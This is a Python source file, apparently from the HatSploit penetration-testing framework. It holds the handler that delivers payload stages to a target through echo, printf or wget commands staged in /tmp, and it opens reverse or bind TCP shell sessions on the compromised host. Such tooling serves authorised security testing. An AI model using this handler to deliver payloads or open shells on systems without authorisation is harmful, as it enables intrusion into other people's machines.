#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatsploit.core.cli.badges import Badges
from hatsploit.core.handler.blinder import Blinder
from hatsploit.core.handler.handle import Handle
from hatsploit.core.handler.post.echo import Echo
from hatsploit.core.handler.post.printf import Printf
from hatsploit.core.handler.post.wget import Wget
from hatsploit.core.handler.session import HatSploitSession
from hatsploit.lib.jobs import Jobs
from hatsploit.lib.modules import Modules
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.storage import LocalStorage


class Handler(Handle, Blinder):
    sessions = Sessions()
    local_storage = LocalStorage()
    modules = Modules()
    jobs = Jobs()
    badges = Badges()

    def do_job(self, name, payload, target, args):
        if payload['Type'].lower() == 'one_side':
            target(*args)
        else:
            module = self.modules.get_current_module_name()
            if module:
                module_name = module
            else:
                module_name = 'handler'

            self.jobs.create_job(
                name,
                module_name,
                target,
                args
            )

    def ensure_linemax(self, payload, linemax):
        min_size = 10000
        max_size = 100000

        if len(payload) >= max_size and linemax not in range(min_size, max_size):
            linemax = max_size

        return linemax

    def send(self, payload, sender, args=[]):
        self.badges.print_process("Sending payload stage...")
        self.badges.print_process("Executing payload...")

        sender(*args, payload)

    def handle_session(self, host=None, port=None, sender=None, args=[],
                       delim=';', location='/tmp', timeout=10, method=None,
                       manual=False, post="printf", linemax=100, ensure=False):

        module = self.modules.get_current_module_object()
        payload = module.payload

        if 'BLINDER' in module.options:
            if module.options['BLINDER']['Value'].lower() in ['yes', 'y']:
                if sender is not None:
                    self.blinder(sender, args)
                    return True

                self.badges.print_warning("Module does not support Blinder, use payload instead.")
                return False

        if payload['Payload'] is None:
            self.badges.print_error("Payload stage is not found!")
            return False

        if post.lower() != 'raw':
            if post.lower() not in self.post:
                self.badges.print_error("Invalid post method selected!")
                return False

        else:
            if not payload['Raw']:
                self.badges.print_error("Payload does not support raw!")
                return False

        if ensure:
            linemax = self.ensure_linemax(payload['Payload'], linemax)

        if sender is not None:
            if payload['Category'].lower() == 'stager':
                if post.lower() == 'raw':
                    self.do_job(
                        "Handler",
                        payload,
                        self.send,
                        [
                            payload['Raw'],
                            sender,
                            args
                        ]
                    )
                else:
                    self.do_job(
                        f"Handler",
                        payload,
                        self.post[post.lower()].send,
                        [
                            payload['Payload'],
                            sender,
                            args,
                            payload['Args'],
                            delim,
                            location,
                            linemax
                        ]
                    )

            elif payload['Category'].lower() == 'single':
                self.do_job(
                    "Handler",
                    payload,
                    self.send,
                    [
                        payload['Payload'],
                        sender,
                        args
                    ]
                )

            else:
                self.badges.print_error("Invalid payload category!")
                return False

        else:
            if method is not None:
                if method.lower() == 'reverse_tcp':
                    if not host and not port:
                        return False
                    new_session, _ = self.listen_session(host, port, HatSploitSession, None)
                    if not new_session:
                        return False

                elif method.lower() == 'bind_tcp':
                    if not host and port:
                        return False
                    new_session = self.connect_session(host, port, HatSploitSession, None)
                    if not new_session:
                        return False

                else:
                    self.badges.print_error("Invalid payload method!")
                    return False

                if payload['Category'].lower() == 'stager':
                    if post.lower() == 'raw':
                        self.do_job(
                            "Handler",
                            payload,
                            self.send,
                            [
                                payload['Raw'],
                                new_session.send_command,
                                args
                            ]
                        )
                    else:
                        self.do_job(
                            f"Handler",
                            payload,
                            self.post[post.lower()].send,
                            [
                                payload['Payload'],
                                new_session.send_command,
                                args,
                                payload['Args'],
                                delim,
                                location,
                                linemax
                            ]
                        )

                elif payload['Category'].lower() == 'single':
                    self.do_job(
                        "Handler",
                        payload,
                        self.send,
                        [
                            payload['Payload'],
                            new_session.send_command
                        ]
                    )

                else:
                    self.badges.print_error("Invalid payload category!")
                    return False

            else:
                if manual is False:
                    self.badges.print_error("Failed to execute payload stage!")
                    return False

        session = payload['Session'] if payload['Session'] is not None else HatSploitSession

        if payload['Type'].lower() == 'reverse_tcp':
            port = module.options['LPORT']['Value']

            new_session, new_remote_host = self.listen_session(
                module.options['LHOST']['Value'],
                module.options['LPORT']['Value'],
                session,
                timeout
            )

            if not new_session and not new_remote_host:
                return False

        elif payload['Type'].lower() == 'bind_tcp':
            if not host:
                host = '127.0.0.1'

            port = module.options['RBPORT']['Value']

            new_session = self.connect_session(host, port, session, timeout)
            new_remote_host = host
            if not new_session:
                return False

        elif payload['Type'].lower() == 'one_side':
            self.badges.print_warning("Payload completed but no session was opened.")
            return True

        else:
            self.badges.print_error("Invalid payload method!")
            return False

        session_platform = payload['Platform']
        session_type = new_session.details['Type']
        new_session.details['Platform'] = session_platform

        if not host:
            host = new_remote_host

        session_id = self.sessions.add_session(session_platform, session_type, host, port, new_session)
        self.badges.print_success(f"Session {str(session_id)} opened!")
        return True

    post = {
        'echo': Echo(),
        'printf': Printf(),
        'wget': Wget()
    }
